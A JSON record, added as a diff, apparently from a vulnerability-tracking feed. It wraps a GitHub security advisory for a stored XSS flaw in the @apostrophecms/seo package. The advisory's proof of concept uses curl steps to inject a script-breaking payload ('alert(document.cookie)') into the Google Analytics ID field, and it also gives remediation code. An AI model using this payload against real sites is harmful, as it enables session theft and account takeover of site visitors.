@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/123746403?v=4\", \"events_url\": \"https://api.github.com/users/H3xV0rT3x/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/H3xV0rT3x/followers\", \"following_url\": \"https://api.github.com/users/H3xV0rT3x/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/H3xV0rT3x/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/H3xV0rT3x\", \"id\": 123746403, \"login\": \"H3xV0rT3x\", \"node_id\": \"U_kgDOB2A4Yw\", \"organizations_url\": \"https://api.github.com/users/H3xV0rT3x/orgs\", \"received_events_url\": \"https://api.github.com/users/H3xV0rT3x/received_events\", \"repos_url\": \"https://api.github.com/users/H3xV0rT3x/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/H3xV0rT3x/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/H3xV0rT3x/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/H3xV0rT3x\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-53608\", \"cvss\": {\"score\": 8.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.7, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-79\", \"name\": \"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"}], \"description\": \"<img width=\\\"1919\\\" height=\\\"1046\\\" alt=\\\"curl\\\" src=\\\"https://github.com/user-attachments/assets/8aa19ff1-7f4b-44ee-83d5-d0dd1a0269f6\\\" />\\n<img width=\\\"1919\\\" height=\\\"775\\\" alt=\\\"xss\\\" src=\\\"https://github.com/user-attachments/assets/a65012e8-9b2f-416f-94df-c00493f2ca1d\\\" />\\n\\n### Summary\\n\\nThe `@apostrophecms/seo` package injects the Google Analytics Tracking ID (`seoGoogleTrackingId`) and Google Tag Manager ID (`seoGoogleTagManager`) directly into `<script>` tag bodies using JavaScript template literals without any sanitization or validation.\\n\\nAny user with editor-level access (the default role for content managers) can set these fields to a malicious value, resulting in stored XSS that executes on every page for every visitor of the site.\\n\\n### Details\\n\\nThe vulnerable code is in `node_modules/@apostrophecms/seo/lib/nodes.js`.\\n\\n**Google Analytics (lines 218–224):**\\n\\n```javascript\\n// seoGoogleTrackingId is inserted RAW into a <script> body — no escaping, no validation\\nbody: [ {\\n  raw: `\\n  window.dataLayer = window.dataLayer || [];\\n  function gtag(){dataLayer.push(arguments);}\\n  gtag('js', new Date());\\n  gtag('config', '${global.seoGoogleTrackingId}');\\n`\\n} ]\\n```\\n\\n**Google Tag Manager (lines 358–362):**\\n\\n```javascript\\nbody: [ {\\n  raw: `(function(w,d,s,l,i){...})(window,document,'script','dataLayer','${global.seoGoogleTagManager}');`\\n} ]\\n```\\n\\nThese nodes are rendered by `renderNodes()` in ApostropheCMS core (`modules/@apostrophecms/template/index.js` lines 1176–1177):\\n\\n```javascript\\nif (node.raw != null) {\\n  return node.raw;  // returned verbatim, no escaping\\n}\\n```\\n\\nThe fields `seoGoogleTrackingId` and `seoGoogleTagManager` are defined as plain `type: 'string'` values with no pattern, minimum length, or maximum length validation in `seo-fields-global/index.js` lines 347–352.\\n\\nApostropheCMS's permission model (`@apostrophecms/permission/index.js` line 121) grants editor-level users the ability to edit and publish the global singleton, meaning a contributor does not need administrator access to exploit this issue.\\n\\n### PoC\\n\\n**Prerequisites:** ApostropheCMS with `@apostrophecms/seo` installed and `seoGoogleAnalytics: true` enabled in module options. An editor-level account.\\n\\n#### Step 1 — Login as editor\\n\\n```bash\\ncurl -s -X POST http://TARGET/api/v1/@apostrophecms/login/login \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -d '{\\\"username\\\":\\\"editor\\\",\\\"password\\\":\\\"password\\\"}'\\n```\\n\\nResponse:\\n\\n```json\\n{\\\"token\\\":\\\"YOUR_TOKEN\\\"}\\n```\\n\\n#### Step 2 — Get the global document ID\\n\\n```bash\\ncurl -s -H \\\"Authorization: Bearer YOUR_TOKEN\\\" \\\\\\n  http://TARGET/api/v1/@apostrophecms/global\\n```\\n\\nNote the `_id` value ending in `:en:draft`.\\n\\n#### Step 3 — Inject payload into Google Analytics ID\\n\\n```bash\\ncurl -s -X PATCH \\\"http://TARGET/api/v1/@apostrophecms/global/GLOBAL_DRAFT_ID\\\" \\\\\\n  -H 'Content-Type: application/json' \\\\\\n  -H \\\"Authorization: Bearer YOUR_TOKEN\\\" \\\\\\n  -d '{\\\"seoGoogleTrackingId\\\":\\\"G-FAKE'\\\"'\\\"'); alert(document.cookie); //\\\"}'\\n```\\n\\n#### Step 4 — Publish\\n\\n```bash\\ncurl -s -X POST \\\"http://TARGET/api/v1/@apostrophecms/global/GLOBAL_DRAFT_ID/publish\\\" \\\\\\n  -H \\\"Authorization: Bearer YOUR_TOKEN\\\"\\n```\\n\\n#### Step 5 — Visit any page\\n\\nThe injected payload appears in `<head>` and executes:\\n\\n```html\\n<script>\\n  gtag('config', 'G-FAKE'); alert(document.cookie); //');\\n</script>\\n```\\n\\n### Impact\\n\\nThis is a Stored Cross-Site Scripting (XSS) vulnerability.\\n\\nAny user with the editor role (the standard content management role in ApostropheCMS) can inject arbitrary JavaScript that executes for every visitor on every page of the site.\\n\\nImpact includes:\\n\\n- Session token theft of all visitors, including other editors and administrators\\n- Full account takeover via stolen administrator cookies\\n- Malware distribution, phishing overlays, or credential harvesting targeting site visitors\\n- Persistent compromise, as the payload remains active until manually removed\\n\\n### Remediation\\n\\nValidate the tracking ID fields against their expected formats before storage, and escape values before inserting them into script bodies.\\n\\n```javascript\\n// Validate format before accepting\\nif (value && !/^(G-|UA-|GTM-)[A-Z0-9-]+$/i.test(value)) {\\n  throw new Error('Invalid tracking ID format');\\n}\\n```\\n\\n```javascript\\n// Use safeJsonForScript instead of raw template literals\\nbody: [ { json: global.seoGoogleTrackingId } ]\\n```\\n\\nOr:\\n\\n```javascript\\n// Escape the value before insertion\\nraw: `gtag('config', ${JSON.stringify(global.seoGoogleTrackingId)});`\\n```\\n<img width=\\\"1919\\\" height=\\\"775\\\" alt=\\\"xss\\\" src=\\\"https://github.com/user-attachments/assets/4f1d6708-093a-4f74-828b-937dbeab62e8\\\" />\", \"epss\": {\"percentage\": 0.0021, \"percentile\": 0.11144}, \"ghsa_id\": \"GHSA-wf43-fpp3-cf65\", \"github_reviewed_at\": \"2026-07-31T21:53:56Z\", \"html_url\": \"https://github.com/advisories/GHSA-wf43-fpp3-cf65\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-wf43-fpp3-cf65\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-53608\"}], \"nvd_published_at\": \"2026-06-12T22:16:52Z\", \"published_at\": \"2026-07-31T21:53:56Z\", \"references\": [\"https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-wf43-fpp3-cf65\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-53608\", \"https://github.com/apostrophecms/apostrophe/pull/5464\", \"https://github.com/apostrophecms/apostrophe/commit/5a88e9630cbbdde33154ef8abe7557ddf7be418b\", \"https://github.com/advisories/GHSA-wf43-fpp3-cf65\"], \"repository_advisory_url\": \"https://api.github.com/repos/apostrophecms/apostrophe/security-advisories/GHSA-wf43-fpp3-cf65\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/apostrophecms/apostrophe\", \"summary\": \"@apostrophecms/seo Vulnerable to Stored XSS via Unsanitized Google Analytics / GTM ID Injected into Script Tag\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-31T21:53:57Z\", \"url\": \"https://api.github.com/advisories/GHSA-wf43-fpp3-cf65\", \"vulnerabilities\": [{\"first_patched_version\": \"1.5.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"@apostrophecms/seo\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.4.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-wf43-fpp3-cf65",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@apostrophecms/seo: <= 1.4.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-53608"
+    ],
+    "cvss_score": 8.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@apostrophecms/seo"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-08-01T19:31:55.024853Z",
+  "provenance": {
+    "content_sha256": "4a5f3e2f751698c34c87650e24f59e294196d33bdaec54b136aed4a2438c7d0c",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-31T21:53:56Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-wf43-fpp3-cf65",
+  "status": "active",
+  "title": "@apostrophecms/seo Vulnerable to Stored XSS via Unsanitized Google Analytics / GTM ID Injected into Script Tag",
+  "updated_at": "2026-07-31T21:53:57Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-wf43-fpp3-cf65"
+}
